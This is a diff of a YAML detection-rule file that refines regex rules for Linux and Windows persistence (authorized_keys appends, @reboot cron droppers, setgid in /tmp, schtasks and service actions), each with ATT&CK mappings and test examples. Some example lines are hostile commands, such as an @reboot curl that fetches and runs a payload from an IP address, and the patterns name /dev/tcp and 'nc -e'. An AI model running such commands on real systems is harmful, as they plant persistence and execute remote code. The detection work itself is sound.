@@ -9,7 +9,7 @@
 - id: mention.persist_authorized_keys_echo_append
   title: 'echo of an SSH public key with >> into authorized_keys'
   match:
-    anchored: 'echo {1,3}["'']?(?:ssh-(?:rsa|ed25519|dss)|ecdsa-sha2-nistp[0-9]{3}) [A-Za-z0-9+/]{40,1000}={0,3}[^\n]{0,120}>> {0,2}[^\n]{0,80}authorized_keys'
+    anchored: 'echo {1,3}[\"'']?(?:ssh-(?:rsa|ed25519|dss)|ecdsa-sha2-nistp[0-9]{3}) [A-Za-z0-9+/]{40,1000}={0,3}[\"'']? [^\n>]{0,80}>> {0,2}[^\s]{0,80}authorized_keys'
   case_sensitive: false
   strength: medium
   attack: [T1098.004]
@@ -34,7 +34,7 @@
 - id: mention.persist_root_authorized_keys_append
   title: 'SSH public key with >> into /root/.ssh/authorized_keys'
   match:
-    anchored: 'ssh-(?:rsa|ed25519|dss) [A-Za-z0-9+/]{40,1000}={0,3}[^\n]{0,120}>> {0,2}/root/\.ssh/authorized_keys'
+    anchored: 'ssh-(?:rsa|ed25519|dss) [A-Za-z0-9+/]{40,1000}={0,3}[\"'']? [^\n>]{0,80}>> {0,2}/root/\.ssh/authorized_keys'
   case_sensitive: false
   strength: medium
   attack: [T1098.004]
@@ -105,9 +105,9 @@
       - '*/5 * * * * root /usr/local/bin/backup.sh > /dev/null 2>&1'
 
 - id: mention.persist_cron_reboot_payload
-  title: '@reboot cron line with a pipe into a shell, a socket or a temp-directory payload'
+  title: '@reboot cron line with a shell pipe, a socket, or a temp-directory path in command position'
   match:
-    anchored: '@reboot[^\n]{1,200}(?:\| {0,3}(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b|/dev/tcp/|nc -e |(?:/tmp|/var/tmp|/dev/shm)/[^\s/]{1,60})'
+    anchored: '@reboot(?:[^\n]{1,200}(?:\| {0,3}(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b|/dev/tcp/|nc -e )| {1,3}(?:nohup |sh |bash |dash )?(?:/tmp|/var/tmp|/dev/shm)/[^\s/]|[^\n]{0,150}(?:;|&&|\|) {0,3}(?:nohup |sh |bash |dash )?(?:/tmp|/var/tmp|/dev/shm)/[^\s/])'
   case_sensitive: false
   strength: strong
   attack: [T1053.003, T1105]
@@ -118,8 +118,9 @@
     license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
     upstream_id: T1053.003
   rationale: >-
-    An @reboot job that pipes downloaded content into a shell, opens a bash socket or runs a file from a temp
-    directory restores an implant at every boot; the technique's procedure examples include @reboot persistence
+    An @reboot job that pipes downloaded content into a shell, opens a bash socket or starts a file from a temp
+    directory (in command position: right after @reboot or after ;, &&, || or |, never as a redirection target or
+    an option value) restores an implant at every boot; the technique's procedure examples include @reboot persistence
     (GoldMax, The Gentlemen ransomware). Health pings ('@reboot curl -fsS https://hc-ping... > /dev/null') and local
     scripts are not matched.
   examples:
@@ -130,6 +131,33 @@
       - '@reboot /usr/local/bin/start-dashboard.sh'
       - 'Nov 20 13:04:00 web01 cron[700]: (CRON) INFO (Running @reboot jobs)'
       - '@reboot curl -fsS -m 10 --retry 5 -o /dev/null https://hc-ping.example.org/eb095278'
+      - '@reboot /usr/local/bin/app >> /tmp/start.log 2>&1'
+      - '@reboot rm -rf /tmp/sessions'
+      - '@reboot /opt/app/bin/app --pidfile /var/tmp/app.pid'
+
+- id: mention.persist_cron_reboot_downloader
+  title: '@reboot cron line with curl or wget'
+  match:
+    anchored: '@reboot[^\n]{0,150}(?:curl|wget) '
+  case_sensitive: false
+  strength: medium
+  attack: [T1053.003, T1105]
+  telemetry: [linux_text]
+  source:
+    name: MITRE ATT&CK Enterprise 20.0, T1053.003 Cron
+    url: https://attack.mitre.org/techniques/T1053/003
+    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
+    upstream_id: T1053.003
+  rationale: >-
+    Author-composed shape from the technique's @reboot procedure examples: a boot-time job that fetches something.
+    Droppers fetch into a home or cache directory and run it with &&; health pings and update checks do the same
+    fetch without running anything, so it is medium. The strong entry covers shell pipes, sockets and temp paths.
+  examples:
+    positive:
+      - '@reboot curl -s -o /home/u/.cache/kx http://203.0.113.7/kx && /home/u/.cache/kx'
+    negative:
+      - '@reboot /usr/local/bin/start-dashboard.sh'
+      - 'Nov 20 13:04:00 web01 cron[700]: (CRON) INFO (Running @reboot jobs)'
 
 - id: mention.persist_crontab_from_echo_downloader
   title: 'echo of a downloader-and-shell-pipe or socket line into crontab -'
@@ -303,6 +331,30 @@
       - 'Nov 20 13:10:04 web01 bash[828]: HISTORY: chmod 2775 /tmp/shared'
       - 'Nov 20 13:10:05 web01 bash[828]: HISTORY: chmod 4755 /usr/local/bin/tool && cp build.log /tmp/'
 
+- id: mention.persist_setgid_in_temp
+  title: chmod setgid mode on a temp-directory path
+  match:
+    anchored: 'chmod {1,3}(?:g\+s|[2367][0-7]{3}) {1,3}(?:/tmp/|/dev/shm/|/var/tmp/)[^\s;&|]{1,100}'
+  case_sensitive: true
+  strength: medium
+  attack: [T1548.001]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Setuid and Setgid (Ömer Günal)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/process_creation/proc_creation_lnx_setgid_setuid.yml
+    license: DRL-1.1
+    upstream_id: c21c4eaa-ba2e-419a-92b2-8371703cbe21
+  rationale: >-
+    The rule's g+s half on a temp path: a setgid helper in /tmp gives its group to whoever runs it. Shared temp
+    directories are also made setgid (chmod 2775) so new files keep the group, so it is medium; a file rather than a
+    directory, or a hidden name, is the lead.
+  examples:
+    positive:
+      - 'Nov 20 13:10:06 web01 bash[829]: HISTORY: chmod g+s /tmp/.helper'
+    negative:
+      - 'Nov 20 13:10:07 web01 bash[830]: HISTORY: chmod 755 /tmp/build/run.sh'
+      - 'Nov 20 13:10:08 web01 bash[831]: HISTORY: chmod g+w /tmp/shared'
+
 - id: mention.persist_setuid_system_shell
   title: 'chmod setuid mode on a system shell (command text)'
   match:
@@ -377,7 +429,7 @@
       - 'Nov 20 13:13:02 web01 bash[837]: HISTORY: grep NOPASSWD /etc/sudoers.d/*'
 
 - id: mention.persist_useradd_duplicate_uid0
-  title: useradd creating a non-unique UID 0 account
+  title: 'useradd -o -u 0 command text'
   match:
     anchored: 'useradd [^\n]{0,100}(?:-o {1,3}-u {1,3}0|-u {1,3}0 {1,3}-o)\b'
   case_sensitive: true
@@ -624,7 +676,7 @@
 - id: mention.persist_schtasks_suspicious_action
   title: 'schtasks /create text with an encoded, IEX, download or remote-HTA action'
   match:
-    anchored: 'schtasks(?:\.exe)?[\"'']? [^\n]{0,40}/create [^\n]{1,300}(?: -enc | -e [A-Za-z0-9+/]{20}|\.DownloadString|\.DownloadFile|\.DownloadData|FromBase64String|mshta(?:\.exe)? http| IEX)'
+    anchored: 'schtasks(?:\.exe)?[\"'']? [^\n]{0,40}/create [^\n]{1,240}(?: -enc |(?:powershell|pwsh)(?:\.exe)?[^\n]{0,60} -e [A-Za-z0-9+/]{20}|\.DownloadString|\.DownloadFile|\.DownloadData|FromBase64String|mshta(?:\.exe)? http| IEX)'
   case_sensitive: false
   strength: strong
   attack: [T1053.005]
@@ -645,6 +697,7 @@
     negative:
       - 'schtasks /create /tn "Corp\Inventory" /tr "C:\Program Files\Corp\inventory.exe" /sc daily /st 02:00'
       - 'schtasks /query /fo LIST /v'
+      - 'schtasks /create /tn Sync /tr "C:\Tools\sync.exe -e AAAAAAAAAAAAAAAAAAAAAAAA" /sc hourly'
 
 - id: mention.persist_schtasks_bypass_hidden_action
   title: schtasks /create text with an execution-policy bypass, hidden window, start /min or -decode
@@ -671,7 +724,7 @@
       - 'schtasks /query /fo LIST /v'
 
 - id: mention.persist_service_binpath_shell
-  title: Service binary path that runs cmd, PowerShell or a user-writable path
+  title: 'Service binpath= text with cmd, PowerShell or a user-writable path'
   match:
     anchored: 'binpath= {0,2}["'']?[^\n]{0,40}(?:cmd(?:\.exe)? {1,3}/c|powershell|%COMSPEC%|\\Users\\Public\\|\\AppData\\|\\Windows\\Temp\\)'
   case_sensitive: false
